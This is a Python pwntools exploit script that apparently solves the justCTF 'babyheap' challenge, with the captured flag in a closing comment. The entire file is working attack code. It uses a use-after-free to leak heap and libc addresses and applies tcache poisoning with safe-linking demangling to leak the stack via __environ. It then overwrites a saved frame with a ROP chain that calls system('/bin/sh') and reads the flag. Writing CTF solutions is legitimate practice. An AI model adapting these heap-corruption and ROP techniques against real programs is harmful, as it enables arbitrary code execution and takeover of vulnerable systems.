#!/usr/bin/env python3

from pwn import *

exe = ELF('./babyheap_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def create(idx, data):
	sla(b"> ", b"1")
	sla(b"Index? ", f"{idx}".encode())
	sa(b"Content? Content? ", data)

def view(idx):
	sla(b"> ", b"2")
	sla(b"Index? ", f"{idx}".encode())

def upd(idx, data):
	sla(b"> ", b"3")
	sla(b"Index? ", f"{idx}".encode())
	sa(b"Content? ", data)

def delete(idx):
	sla(b"> ", b"4")
	sla(b"Index? ", f"{idx}".encode())

script = '''
brva 0x158E
'''

p = remote("baby-heap.nc.jctf.pro", 1337)
#p = process('./babyheap_patched')
#p = gdb.debug('./babyheap_patched', gdbscript = script)

# leak heap
create(0, b"0" * 0x10)
create(1, b"1" * 0x10)
delete(0)
view(0)
heap_base = u64(p.recv(5).ljust(8, b"\x00")) << 12
lleak("heap", heap_base)

# tcache poisoning
## prepare fake unsortedbin head
delete(1)
mangle = (heap_base + 0x2d0) ^ (heap_base + 0x2e0) >> 12
upd(1, p64(mangle))
create(2, b"2" * 0x10) # fake unsortedbin chunk
create(3, b"3" * 8 + p64(0x511)) # fake unsortebin size = 0x510

## prepare fake adjacent chunk and next chunk'size after adjacent chunk
create(4, b"4" * 0x10)
upd(0, b"0" * 0x10)
delete(0)
delete(4)
mangle = (heap_base + 0x7e0) ^ (heap_base + 0x320) >> 12
upd(4, p64(mangle))
create(5, b"5" * 0x10)
create(6, b"6" * 8 + p64(0x21) + b"6" * 0x18 + p64(0x11))

# free fake unsortedbin chunk
delete(2)

# leak libc
view(2)
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x203b20
lleak("libc", libc_base)

# tcache poisoning to environ -> leak stack
upd(0, b"0" * 0x10)
delete(0)
delete(5)
mangle = (libc_base + libc.symbols['__environ'] - 0x18) ^ (heap_base + 0x320) >> 12
upd(5, p64(mangle))
create(7, b"7" * 0x10)
create(8, b"8" * 0x18)
view(8)
rcu(b"8" * 0x18)
rsp_main = u64(p.recv(6).ljust(8, b"\x00")) - 0x148
lleak("rsp main", rsp_main)

# tcache poisoning to saved rbp of create function -> rop
upd(0, b"0" * 0x10)
delete(0)
delete(7)
mangle = (rsp_main - 0x10) ^ (heap_base + 0x320) >> 12
upd(7, p64(mangle))
create(9, b"9" * 0x10)

pop_rdi = libc_base + 0x000000000010f75b
ret = pop_rdi + 1
system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
create(10, b"A" * 8 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system))

sl(b"cat flag.txt")

p.interactive()
#justCTF{ofc_the_R_in_CRUD_stands_for_ROPchain}
